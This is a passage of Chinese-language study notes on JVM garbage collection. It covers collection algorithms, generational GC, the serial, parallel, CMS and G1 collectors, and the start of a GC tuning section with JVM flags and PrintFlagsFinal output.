<h3 id="2、垃圾回收算法"><a href="#2、垃圾回收算法" class="headerlink" title="2、垃圾回收算法"></a>2、垃圾回收算法</h3><h4 id="2-1-标记清除"><a href="#2-1-标记清除" class="headerlink" title="2.1 标记清除"></a>2.1 标记清除</h4><p><strong>定义</strong>：标记清除算法顾名思义，是指在虚拟机执行垃圾回收的过程中，先采用标记算法确定可回收对象，然后垃圾收集器根据标识清除相应的内容，给堆内存腾出相应的空间。</p>
<p><img src="/images/java/jvm/回收算法-标记.png" alt></p>
<p><strong>优点</strong>：速度快</p>
<p><strong>缺点</strong>：<strong>容易产生大量的内存碎片</strong>，可能无法满足大对象的内存分配，一旦导致无法分配对象，那就会导致JVM启动GC，一旦启动GC，我们的应用程序就会暂停，这就导致应用的响应速度变慢。</p>
<h4 id="2-2-标记整理"><a href="#2-2-标记整理" class="headerlink" title="2.2 标记整理"></a>2.2 标记整理</h4><p>标记-整理 会将不被GC Root引用的对象回收，清楚其占用的内存空间。然后整理剩余的对象，可以有效避免因内存碎片而导致的问题，但是因为整体需要消耗一定的时间，所以效率较低。</p>
<p><strong>优点</strong>：不会有内存碎片</p>
<p><strong>缺点</strong>：速度慢</p>
<p><img src="/images/java/jvm/回收算法-标记整理.png" alt></p>
<h4 id="2-3-复制"><a href="#2-3-复制" class="headerlink" title="2.3 复制"></a>2.3 复制</h4><p>将内存分为大小相等的两个区域，FROM和TO（TO中为空）。先将被GC Root引用的对象从FROM放入TO中，再回收不被GC Root引用的对象。然后交换FROM和TO。</p>
<p><strong>优点</strong>：不会有内存碎片</p>
<p><strong>缺点</strong>：需要占用双倍内存空间</p>
<p><img src="/images/java/jvm/回收算法-复制-标记垃圾内存.png" alt></p>
<p><img src="/images/java/jvm/回收算法-复制-移动有用对象到TO区.png" alt></p>
<p><img src="/images/java/jvm/回收算法-复制-清空FROM区的垃圾.png" alt></p>
<p><img src="/images/java/jvm/回收算法-交换FROM-TO区.png" alt></p>
<h3 id="3、分代垃圾回收"><a href="#3、分代垃圾回收" class="headerlink" title="3、分代垃圾回收"></a>3、分代垃圾回收</h3><p>分为两大区：新生代和老年代。需长期存活的对象会存放在老年代区，很少发生垃圾回收；在新生代，垃圾回收发生频繁，处理生命周期比较短的对象。新生代也细分为三个区：</p>
<ul>
<li>新生代<ul>
<li>伊甸园（Eden）</li>
<li>幸存区（Survivor）From</li>
<li>幸存区（Survivor）To</li>
</ul>
</li>
<li>老年代</li>
</ul>
<p><img src="/images/java/jvm/分代回收.png" alt></p>
<blockquote>
<p>新生代区发生的垃圾回收称为：Minor GC</p>
</blockquote>
<ul>
<li>新创建的对象默认存放在Eden区</li>
<li>当Eden区内存不足，会触发垃圾回收 <code>Minor GC</code> ，存活的对象会复制到 “幸存区To”。存活对象寿命加1，再交换幸存区（From - To）。</li>
<li><code>Minor GC</code> 会引发 <code>stop the world</code> ，暂停其他用户线程，等垃圾回收结束，用户线程才恢复运行。</li>
<li>当Eden区再次内存不足，再触发垃圾回收 <code>Minor GC</code> ，Eden区存活对象复制到 “幸存区To”，并且回收 “幸存区From”，“幸存区From”存活对象也复制到“幸存区To”。存活对象寿命加1（原来“幸存区From”存活对象这时候寿命是 2 了），再交换幸存区（From - To）。</li>
<li>如果幸存区中的对象的<strong>寿命超过阈值</strong>，会晋升老年代，最大寿命是15(4bit）。</li>
<li>新生代和老年代中的内存都满了，就会先尝试触发 <code>Minor GC</code> ，如果空间扔不足，再触发<code>Full GC</code>， <code>stop the world</code> 时间更长。</li>
</ul>
<p><img src="/images/java/jvm/分代回收VM参数.png" alt></p>
<h4 id="GC分析总结"><a href="#GC分析总结" class="headerlink" title="GC分析总结"></a>GC分析总结</h4><ul>
<li><p><strong>大对象处理策略</strong></p>
<p>当遇到一个较大的对象时，就算新生代的伊甸园为空，也无法容纳该对象时，会将该对象直接晋升为老年代</p>
</li>
<li><p><strong>线程内存溢出</strong></p>
<p>某个线程的内存溢出了而抛异常（out of memory），不会让其他的线程结束运行<br>这是因为当一个线程抛出OOM异常后，它所占据的内存资源会全部被释放掉，从而不会影响其他线程的运行，进程依然正常。</p>
</li>
</ul>
<h3 id="4、垃圾回收器"><a href="#4、垃圾回收器" class="headerlink" title="4、垃圾回收器"></a>4、垃圾回收器</h3><blockquote>
<p>STW: Stop The World，<code>Minor GC</code> 会引发 Stop The World ，暂停其他用户线程，等垃圾回收结束，用户线程才恢复运行。</p>
</blockquote>
<p>三种垃圾回收器概述和特点比较：</p>
<ul>
<li>串行<ul>
<li>单线程</li>
<li>堆内存较小，适合个人电脑</li>
</ul>
</li>
<li>吞吐量优先<ul>
<li>多线程</li>
<li>堆内存较大，多个CPU</li>
<li>让单位时间内，总的STW时间最短，如2次GC： 0.2 + 0.2 = 0.4</li>
</ul>
</li>
<li>响应时间优先<ul>
<li>多线程</li>
<li>堆内存较大，多个CPU</li>
<li>尽可能让单次STW的时间最短，如5次GC： 0.1 + 0.1 + 0.1 + 0.1 + 0.1 = 0.5</li>
</ul>
</li>
</ul>
<h4 id="4-1-串行"><a href="#4-1-串行" class="headerlink" title="4.1 串行"></a>4.1 串行</h4><p><img src="/images/java/jvm/垃圾回收器-串行.png" alt></p>
<p>因为是串行的，所以只有一个垃圾回收线程。且在该线程执行回收工作时，其他线程进入<strong>阻塞</strong>状态。</p>
<h4 id="4-2-吞吐量优先"><a href="#4-2-吞吐量优先" class="headerlink" title="4.2 吞吐量优先"></a>4.2 吞吐量优先</h4><p>并行执行，会暂停用户线程。</p>
<p><img src="/images/java/jvm/垃圾回收器-吞吐量优先.png" alt></p>
<h4 id="4-3-响应时间优先"><a href="#4-3-响应时间优先" class="headerlink" title="4.3 响应时间优先"></a>4.3 响应时间优先</h4><p>并发执行，不暂停用户线程，和用户线程并发执行（与用户线程抢CPU）。</p>
<p>基于<strong>标记-清除算法</strong>实现。并发收集、低停顿，但是会产生内存碎片。</p>
<p><img src="/images/java/jvm/垃圾回收器-响应时间优先.png" alt></p>
<h4 id="4-4-G1-（Garbage-First）"><a href="#4-4-G1-（Garbage-First）" class="headerlink" title="4.4 G1 （Garbage First）"></a>4.4 G1 （Garbage First）</h4><p>G1是一个垃圾回收器， <strong>JDK7</strong> 由官方支持， <strong>JDK9</strong> 开始被默认使用的垃圾回收器（废弃了CMS垃圾回收器），适用场景：</p>
<ul>
<li>同时注重吞吐量（Throughput）和低延迟（Low latency）</li>
<li>超大堆内存（内存大的），会将堆内存划分为多个 <strong>大小相等</strong> 的区域（Region）</li>
<li>整体上是 <strong>标记+整理</strong> 算法，两个区域（Region）之间是 <strong>复制</strong> 算法</li>
</ul>
<p>相关的参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:+UseG1GC                  //开关，JDK8要手动开启</span><br><span class="line">-XX:G1HeapRegionSize=size</span><br><span class="line">-XX:MaxGCPauseMillis=time     //默认200ms</span><br></pre></td></tr></table></figure>
<h5 id="4-4-1-G1垃圾回收阶段"><a href="#4-4-1-G1垃圾回收阶段" class="headerlink" title="4.4.1 G1垃圾回收阶段"></a>4.4.1 G1垃圾回收阶段</h5><p>这是一个循环的过程</p>
<p><img src="/images/java/jvm/G1_新生代.png" alt></p>
<h5 id="4-4-2-G1-Young-Collection"><a href="#4-4-2-G1-Young-Collection" class="headerlink" title="4.4.2 G1 Young Collection"></a>4.4.2 G1 Young Collection</h5><p>会STW</p>
<blockquote>
<p>E: 伊甸园区</p>
<p>S: 幸存区</p>
<p>O: 老年代</p>
</blockquote>
<p>新生代伊甸园区</p>
<p><img src="/images/java/jvm/G1_YoungCollection_1.png" alt></p>
<p>新生代垃圾回收：幸存对象 -&gt; 复制算法 -&gt; 幸存区</p>
<p><img src="/images/java/jvm/G1_YoungCollection_2.png" alt></p>
<p>新生代垃圾回收：幸存区大龄对象 -&gt; 复制算法 -&gt; 老年代</p>
<p><img src="/images/java/jvm/G1_YoungCollection_3.png" alt></p>
<h5 id="4-4-3-G1-Young-Collection-CM-并发标记"><a href="#4-4-3-G1-Young-Collection-CM-并发标记" class="headerlink" title="4.4.3 G1 Young Collection + CM(并发标记)"></a>4.4.3 G1 Young Collection + CM(并发标记)</h5><ul>
<li>在 Young GC 时会对 <strong>GC Root</strong> 进行初始标记</li>
<li>在老年代占用 <strong>堆内存的比例</strong> 达到阈值时，对进行并发标记（不会STW），由参数 <code>-XX:InitiatingHeapOccupancyPercent=percent(默认45%)</code></li>
</ul>
<p><img src="/images/java/jvm/G1_YoungCollection_CM.png" alt></p>
<h5 id="4-4-4-G1-Mixed-Collection-混合回收"><a href="#4-4-4-G1-Mixed-Collection-混合回收" class="headerlink" title="4.4.4 G1 Mixed Collection (混合回收)"></a>4.4.4 G1 Mixed Collection (混合回收)</h5><p> 会对 <code>E</code> <code>S</code> <code>O</code> 进行<strong>全面的垃圾回收</strong></p>
<ul>
<li>最终标记 (Remark) 会STW</li>
<li>拷贝存活 (Evacuation) 会STW</li>
</ul>
<p><code>-XX:MaxGCPauseMills:ms</code>  用于指定最长的停顿时间</p>
<p><strong>问</strong>：为什么有的老年代被拷贝了，有的没拷贝？</p>
<p>因为指定了最大停顿时间，如果对所有老年代都进行回收，耗时可能过高。为了保证时间不超过设定的停顿时间，会<strong>回收最有价值的老年代</strong>（回收后，能够得到更多内存）</p>
<p><img src="/images/java/jvm/G1_YoungCollection_MIXED.png" alt></p>
<h5 id="4-4-5-Full-GC"><a href="#4-4-5-Full-GC" class="headerlink" title="4.4.5  Full GC"></a>4.4.5  Full GC</h5><ul>
<li>SerialGC<ul>
<li>新生代内存不足发生的垃圾回收 – minor gc</li>
<li>老年代内存不足发生的垃圾回收 – Full GC</li>
</ul>
</li>
<li>ParallelGC<ul>
<li>新生代内存不足发生的垃圾回收 – minor gc</li>
<li>老年代内存不足发生的垃圾回收 – Full GC</li>
</ul>
</li>
<li>CMS<ul>
<li>新生代内存不足发生的垃圾回收 – minor gc</li>
<li>老年代内存不足</li>
</ul>
</li>
<li>G1<ul>
<li>新生代内存不足发生的垃圾回收 – minor gc</li>
<li>老年代内存不足（老年代所占内存超过阈值）<ul>
<li><strong>如果垃圾产生速度慢于垃圾回收速度，不会触发Full GC，还是并发地进行清理</strong></li>
<li><strong>如果垃圾产生速度快于垃圾回收速度，便会触发Full GC</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="4-4-6-G1-Young-Collection-跨代引用"><a href="#4-4-6-G1-Young-Collection-跨代引用" class="headerlink" title="4.4.6  G1 Young Collection 跨代引用"></a>4.4.6  G1 Young Collection 跨代引用</h5><p>新生代回收的跨代引用（老年代引用新生代）问题</p>
<blockquote>
<p><strong>老年代</strong>区细分为多个<strong>卡表</strong>，如果某卡表中有对象引用了<strong>新生代</strong>的对象，那么这块区域标记为 <strong>脏卡</strong>。</p>
</blockquote>
<ul>
<li>卡表与Remembered Set<ul>
<li>Remembered Set 存在于E中，用于保存新生代对象对应的脏卡<ul>
<li>脏卡：O被划分为多个区域（一个区域512K），如果该区域引用了新生代对象，则该区域被称为脏卡</li>
</ul>
</li>
</ul>
</li>
<li>在引用变更时通过post-write barried + dirty card queue  （更新指令先放入脏卡队列）</li>
<li>concurrent refinement threads  更新 Remembered Set （由一个线程完成更新脏卡的操作）</li>
</ul>
<p><img src="/images/java/jvm/脏卡0.png" alt></p>
<p><img src="/images/java/jvm/脏卡2.png" alt></p>
<h5 id="4-4-7-G1-Remark-（重新标记）"><a href="#4-4-7-G1-Remark-（重新标记）" class="headerlink" title="4.4.7  G1 Remark （重新标记）"></a>4.4.7  G1 Remark （重新标记）</h5><blockquote>
<p>黑色：已被处理，需要保留的  </p>
<p>灰色：正在处理中的 </p>
<p>白色：还未处理的</p>
</blockquote>
<p>并发阶段标记时处理示例图：</p>
<p><img src="/images/java/jvm/remark_0.png" alt></p>
<p>并发下，下图中对C对象的处理可能受到用户线程的影响，比如：</p>
<p>标记前，“B对象”对“C对象”的引用被用户线程删除，这时“C对象”没有引用被标记为白色（垃圾），但标记尚未完成，“C对象”又被用户线程作为“A对象”的引用，但“C对象”已经被误标记为垃圾。</p>
<p>这种问题就要通过remark来解决。</p>
<p><img src="/images/java/jvm/remark_1.png" alt></p>
<p>重新标记阶段处理示意图：</p>
<p><img src="/images/java/jvm/remark_2.png" alt></p>
<ul>
<li>当引用发生改变时，JVM给它加入一个写屏障</li>
<li>当A引用了C，就会给C加一个写屏障，写屏障的指令会被执行，指令执行的操作是将C放入一个队列（satb_mark_queue）当中，并将C变为 “处理中” 灰色状态</li>
<li>在并发标记阶段结束以后，进入重新标记阶段（会STW），然后将放在该队列中的对象重新处理，发现有强引用引用它，就不会垃圾回收它。</li>
</ul>
<h5 id="4-4-8-JDK-8u20字符串去重"><a href="#4-4-8-JDK-8u20字符串去重" class="headerlink" title="4.4.8  JDK 8u20字符串去重"></a>4.4.8  JDK 8u20字符串去重</h5><p>优点与缺点</p>
<ul>
<li>节省了大量内存</li>
<li>新生代回收时间略微增加，导致略微多占用CPU</li>
</ul>
<p>字符串去重</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//开关</span></span><br><span class="line">-XX:+UseStringDeduplication</span><br><span class="line"></span><br><span class="line"><span class="comment">//不同的对象，使用的是同一个char数组</span></span><br><span class="line">String s1 = <span class="keyword">new</span> String(<span class="string">"hello"</span>); <span class="comment">// char[]&#123;'h','e','l','l','o'&#125;</span></span><br><span class="line">String s1 = <span class="keyword">new</span> String(<span class="string">"hello"</span>); <span class="comment">// char[]&#123;'h','e','l','l','o'&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将所有新分配的字符串（底层是char[]）放入一个队列</li>
<li>当<strong>新生代</strong>回收时，G1并发检查是否有重复的字符串</li>
<li>如果字符串的值一样，就让他们<strong>引用同一个字符串对象</strong></li>
<li>注意，其与 <code>String.intern()</code> 的区别<ul>
<li><code>String.intern()</code>关注的是字符串对象</li>
<li>“字符串去重”关注的是char[]</li>
<li>在JVM内部，使用了不同的字符串表</li>
</ul>
</li>
</ul>
<h5 id="4-4-9-JDK-8u40-并发标记类卸载"><a href="#4-4-9-JDK-8u40-并发标记类卸载" class="headerlink" title="4.4.9 JDK 8u40 并发标记类卸载"></a>4.4.9 JDK 8u40 并发标记类卸载</h5><p> JDK 8u40在并发标记阶段结束以后，就能知道哪些类不再被使用。如果一个类加载器的所有类都不在使用，则卸载它所加载的所有类。</p>
<p>开关：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-XX:+ClassUnloadingWithConcurrentMark 默认启用</span><br></pre></td></tr></table></figure>
<h5 id="4-4-10-JDK-8u60回收巨型对象"><a href="#4-4-10-JDK-8u60回收巨型对象" class="headerlink" title="4.4.10 JDK 8u60回收巨型对象"></a>4.4.10 JDK 8u60回收巨型对象</h5><ul>
<li>一个对象大于region的一半时，就称为巨型对象</li>
<li>G1不会对巨型对象进行拷贝</li>
<li>回收时被优先考虑</li>
<li>G1会跟踪老年代所有incoming引用，如果老年代incoming引用为0的巨型对象就可以在<strong>新生代</strong>垃圾回收时处理掉</li>
</ul>
<p><img src="/images/java/jvm/巨型对象0.png" alt></p>
<p><img src="/images/java/jvm/巨型对象1.png" alt></p>
<h5 id="4-4-11-JDK-9并发标记起始时间的调整"><a href="#4-4-11-JDK-9并发标记起始时间的调整" class="headerlink" title="4.4.11 JDK 9并发标记起始时间的调整"></a>4.4.11 JDK 9并发标记起始时间的调整</h5><ul>
<li>并发标记必须在堆空间占满前完成，否则退化为Full GC</li>
<li>JDK9之前，需要使用 <code>-XX:InitatingHeapOccupancyPercent</code> 指定比例</li>
<li>JDK9可以动态调整此值<ul>
<li><code>-XX:InitiatingHeapOccupancyPercent</code> 用来设置初始值</li>
<li>JVM进行数据采样并动态调整</li>
<li>总会添加一个安全的空档空间</li>
</ul>
</li>
</ul>
<h3 id="5、GC-垃圾回收-调优"><a href="#5、GC-垃圾回收-调优" class="headerlink" title="5、GC(垃圾回收)调优"></a>5、GC(垃圾回收)调优</h3><p>调优跟应用、环境等因素有关，需要根据经验做出调整。</p>
<p>查看Java虚拟机调优参数命令，具体命令可以看官网的文档说明。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -XX:+PrintFlagsFinal -version | findstr "GC"</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">❯ java <span class="literal">-XX</span>:+PrintFlagsFinal <span class="literal">-version</span> | findstr <span class="string">"GC"</span></span><br><span class="line">java version <span class="string">"11.0.1"</span> <span class="number">2018</span><span class="literal">-10</span><span class="literal">-16</span> LTS</span><br><span class="line">Java(TM) SE Runtime Environment <span class="number">18.9</span> (build <span class="number">11.0</span>.<span class="number">1</span>+<span class="number">13</span><span class="literal">-LTS</span>)</span><br><span class="line">Java HotSpot(TM) <span class="number">64</span><span class="literal">-Bit</span> Server VM <span class="number">18.9</span> (build <span class="number">11.0</span>.<span class="number">1</span>+<span class="number">13</span><span class="literal">-LTS</span>, mixed mode)</span><br><span class="line">    uintx AdaptiveSizeMajorGCDecayTimeScale        = <span class="number">10</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool BindGCTaskThreadsToCPUs                  = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     uint ConcGCThreads                            = <span class="number">1</span>                                         &#123;product&#125; &#123;ergonomic&#125;</span><br><span class="line">     bool DisableExplicitGC                        = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool ExplicitGCInvokesConcurrent              = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx G1MixedGCCountTarget                     = <span class="number">8</span>                                         &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx GCDrainStackTargetSize                   = <span class="number">64</span>                                        &#123;product&#125; &#123;ergonomic&#125;</span><br><span class="line">    uintx GCHeapFreeLimit                          = <span class="number">2</span>                                         &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx GCLockerEdenExpansionPercent             = <span class="number">5</span>                                         &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool GCLockerInvokesConcurrent                = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx GCPauseIntervalMillis                    = <span class="number">201</span>                                       &#123;product&#125; &#123;default&#125;</span><br><span class="line">     uint GCTaskTimeStampEntries                   = <span class="number">200</span>                                       &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx GCTimeLimit                              = <span class="number">98</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx GCTimeRatio                              = <span class="number">12</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool HeapDumpAfterFullGC                      = false                                  &#123;manageable&#125; &#123;default&#125;</span><br><span class="line">     bool HeapDumpBeforeFullGC                     = false                                  &#123;manageable&#125; &#123;default&#125;</span><br><span class="line">   size_t HeapSizePerGCThread                      = <span class="number">43620760</span>                                  &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx MaxGCMinorPauseMillis                    = <span class="number">18446744073709551615</span>                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx MaxGCPauseMillis                         = <span class="number">200</span>                                       &#123;product&#125; &#123;default&#125;</span><br><span class="line">      int ParGCArrayScanChunk                      = <span class="number">50</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx ParGCDesiredObjsFromOverflowList         = <span class="number">20</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool ParGCTrimOverflow                        = true                                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool ParGCUseLocalOverflow                    = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">    uintx ParallelGCBufferWastePct                 = <span class="number">10</span>                                        &#123;product&#125; &#123;default&#125;</span><br><span class="line">     uint ParallelGCThreads                        = <span class="number">4</span>                                         &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool PrintGC                                  = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool PrintGCDetails                           = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool ScavengeBeforeFullGC                     = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseAdaptiveGCBoundary                    = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseAdaptiveSizeDecayMajorGCCost          = true                                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseAdaptiveSizePolicyWithSystemGC        = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseConcMarkSweepGC                       = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseDynamicNumberOfGCThreads              = true                                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseG1GC                                  = true                                      &#123;product&#125; &#123;ergonomic&#125;</span><br><span class="line">     bool UseGCOverheadLimit                       = true                                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseGCTaskAffinity                        = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseMaximumCompactionOnSystemGC           = true                                      &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseParallelGC                            = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseParallelOldGC                         = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     bool UseSerialGC                              = false                                     &#123;product&#125; &#123;default&#125;</span><br><span class="line">     </span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span> <span class="string">"C:\Program Files\Java\jdk1.8.0_25\bin\java"</span> <span class="literal">-XX</span>:+PrintFlagsFinal <span class="literal">-version</span> | findstr <span class="string">"GC"</span></span><br><span class="line">java version <span class="string">"1.8.0_181"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build <span class="number">1.8</span>.<span class="number">0</span>_181<span class="literal">-b13</span>)</span><br><span class="line">Java HotSpot(TM) <span class="number">64</span><span class="literal">-Bit</span> Server VM (build <span class="number">25.181</span><span class="literal">-b13</span>, mixed mode)</span><br><span class="line">    uintx AdaptiveSizeMajorGCDecayTimeScale         = <span class="number">10</span>                                  &#123;product&#125;</span><br><span class="line">    uintx AutoGCSelectPauseMillis                   = <span class="number">5000</span>                                &#123;product&#125;</span><br><span class="line">     bool BindGCTaskThreadsToCPUs                   = false                               &#123;product&#125;</span><br><span class="line">    uintx CMSFullGCsBeforeCompaction                = <span class="number">0</span>                                   &#123;product&#125;</span><br><span class="line">    uintx ConcGCThreads                             = <span class="number">0</span>                                   &#123;product&#125;</span><br><span class="line">     bool DisableExplicitGC                         = false                               &#123;product&#125;</span><br><span class="line">     bool ExplicitGCInvokesConcurrent               = false                               &#123;product&#125;</span><br><span class="line">     bool ExplicitGCInvokesConcurrentAndUnloadsClasses  = false                               &#123;product&#125;</span><br><span class="line">    uintx G1MixedGCCountTarget                      = <span class="number">8</span>                                   &#123;product&#125;</span><br><span class="line">    uintx GCDrainStackTargetSize                    = <span class="number">64</span>                                  &#123;product&#125;</span><br><span class="line">    uintx GCHeapFreeLimit                           = <span class="number">2</span>                                   &#123;product&#125;</span><br><span class="line">    uintx GCLockerEdenExpansionPercent              = <span class="number">5</span>                                   &#123;product&#125;</span><br><span class="line">     bool GCLockerInvokesConcurrent                 = false                               &#123;product&#125;</span><br><span class="line">    uintx GCLogFileSize                             = <span class="number">8192</span>                                &#123;product&#125;</span><br><span class="line">    uintx GCPauseIntervalMillis                     = <span class="number">0</span>                                   &#123;product&#125;</span><br><span class="line">    uintx GCTaskTimeStampEntries                    = <span class="number">200</span>                                 &#123;product&#125;</span><br><span class="line">    uintx GCTimeLimit                               = <span class="number">98</span>                                  &#123;product&#125;</span><br><span class="line">    uintx GCTimeRatio                               = <span class="number">99</span>                                  &#123;product&#125;</span><br><span class="line">     bool HeapDumpAfterFullGC                       = false                               &#123;manageable&#125;</span><br><span class="line">     bool HeapDumpBeforeFullGC                      = false                               &#123;manageable&#125;</span><br><span class="line">    uintx HeapSizePerGCThread                       = <span class="number">87241520</span>                            &#123;product&#125;</span><br><span class="line">    uintx MaxGCMinorPauseMillis                     = <span class="number">4294967295</span>                          &#123;product&#125;</span><br><span class="line">    uintx MaxGCPauseMillis                          = <span class="number">4294967295</span>                          &#123;product&#125;</span><br><span class="line">    uintx NumberOfGCLogFiles                        = <span class="number">0</span>                                   &#123;product&#125;</span><br><span class="line">     intx ParGCArrayScanChunk                       = <span class="number">50</span>                                  &#123;product&#125;</span><br><span class="line">    uintx ParGCDesiredObjsFromOverflowList          = <span class="number">20</span>                                  &#123;product&#125;</span><br><span class="line">     bool ParGCTrimOverflow                         = true                                &#123;product&#125;</span><br><span class="line">     bool ParGCUseLocalOverflow                     = false                               &#123;product&#125;</span><br><span class="line">    uintx ParallelGCBufferWastePct                  = <span class="number">10</span>                                  &#123;product&#125;</span><br><span class="line">    uintx ParallelGCThreads                         = <span class="number">4</span>                                   &#123;product&#125;</span><br><span class="line">     bool ParallelGCVerbose                         = false                               &#123;product&#125;</span><br><span class="line">     bool PrintClassHistogramAfterFullGC            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintClassHistogramBeforeFullGC           = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGC                                   = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCApplicationConcurrentTime          = false                               &#123;product&#125;</span><br><span class="line">     bool PrintGCApplicationStoppedTime             = false                               &#123;product&#125;</span><br><span class="line">     bool PrintGCCause                              = true                                &#123;product&#125;</span><br><span class="line">     bool PrintGCDateStamps                         = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCDetails                            = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCID                                 = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintGCTaskTimeStamps                     = false                               &#123;product&#125;</span><br><span class="line">     bool PrintGCTimeStamps                         = false                               &#123;manageable&#125;</span><br><span class="line">     bool PrintHeapAtGC                             = false                               &#123;product rw&#125;</span><br><span class="line">     bool PrintHeapAtGCExtended                     = false                               &#123;product rw&#125;</span><br><span class="line">     bool PrintJNIGCStalls                          = false                               &#123;product&#125;</span><br><span class="line">     bool PrintParallelOldGCPhaseTimes              = false                               &#123;product&#125;</span><br><span class="line">     bool PrintReferenceGC                          = false                               &#123;product&#125;</span><br><span class="line">     bool ScavengeBeforeFullGC                      = true                                &#123;product&#125;</span><br><span class="line">     bool TraceDynamicGCThreads                     = false                               &#123;product&#125;</span><br><span class="line">     bool TraceParallelOldGCTasks                   = false                               &#123;product&#125;</span><br><span class="line">     bool UseAdaptiveGCBoundary                     = false                               &#123;product&#125;</span><br><span class="line">     bool UseAdaptiveSizeDecayMajorGCCost           = true                                &#123;product&#125;</span><br><span class="line">     bool UseAdaptiveSizePolicyWithSystemGC         = false                               &#123;product&#125;</span><br><span class="line">     bool UseAutoGCSelectPolicy                     = false                               &#123;product&#125;</span><br><span class="line">     bool UseConcMarkSweepGC                        = false                               &#123;product&#125;</span><br><span class="line">     bool UseDynamicNumberOfGCThreads               = false                               &#123;product&#125;</span><br><span class="line">     bool UseG1GC                                   = false                               &#123;product&#125;</span><br><span class="line">     bool UseGCLogFileRotation                      = false                               &#123;product&#125;</span><br><span class="line">     bool UseGCOverheadLimit                        = true                                &#123;product&#125;</span><br><span class="line">     bool UseGCTaskAffinity                         = false                               &#123;product&#125;</span><br><span class="line">     bool UseMaximumCompactionOnSystemGC            = true                                &#123;product&#125;</span><br><span class="line">     bool UseParNewGC                               = false                               &#123;product&#125;</span><br><span class="line">     bool UseParallelGC                            := true                                &#123;product&#125;</span><br><span class="line">     bool UseParallelOldGC                          = true                                &#123;product&#125;</span><br><span class="line">     bool UseSerialGC                               = false                               &#123;product&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-1-调优领域"><a href="#5-1-调优领域" class="headerlink" title="5.1 调优领域"></a>5.1 调优领域</h4><ul>
<li>内存</li>
<li>锁竞争</li>
<li>CPU占用</li>
<li>IO</li>
<li>GC</li>
</ul>
<h4 id="5-2-确定目标"><a href="#5-2-确定目标" class="headerlink" title="5.2 确定目标"></a>5.2 确定目标</h4><p>应用需要【低延迟】还是【高吞吐量】？情景举例：</p>
<ul>
<li>示例1：科学运算应用追求【高吞吐量】，延迟时间影响不大，可以选择【高吞吐量】垃圾回收器ParallelGC。</li>
<li><p>示例2：互联网应用需要更快的响应时间，可以选择【低延迟】垃圾回收器。</p>
<p>选择合适的回收器：</p>
</li>
<li><p>【低延迟】垃圾回收器：CMS G1 ZGC </p>
</li>
<li><p>【高吞吐量】垃圾回收器：ParallelGC </p>
</li>
<li>Zing GC 回收器自称零STW，可管理超大内存</li>
</ul>
<h4 id="5-3-最好的GC是不发生GC"><a href="#5-3-最好的GC是不发生GC" class="headerlink" title="5.3 最好的GC是不发生GC"></a>5.3 最好的GC是不发生GC</h4><p>如果经常发生Full GC，首先应该检查代码问题，比如：查数据库把整张表的数据都拿出来了。</p>
<p>查看Full GC前后的内存占用，考虑以下几个问题</p>
<ul>
<li>数据是不是太多？（select * from big_tables）</li>
<li>数据表示是否太臃肿<ul>
<li>对象图</li>
<li>对象大小</li>
</ul>
</li>
<li>是否存在内存泄漏<ul>
<li>static Map map = new HashMap()作为缓存 </li>
<li>一直往map防止对象而不移除，越积越多</li>
<li>可以用软、弱引用解决</li>
<li>或者Redis等第三方软件作为缓存</li>
</ul>
</li>
</ul>
<h4 id="5-4-新生代调优"><a href="#5-4-新生代调优" class="headerlink" title="5.4 新生代调优"></a>5.4 新生代调优</h4><p>新生代的特点</p>
<ul>
<li>所有的new操作分配内存都是非常廉价的<ul>
<li>TLAB： thread-local allocation buffer (线程局部分配缓冲区)</li>
<li>TLAB的作用是让每个线程用私有的伊甸园区来分配new对象内存</li>
</ul>
</li>
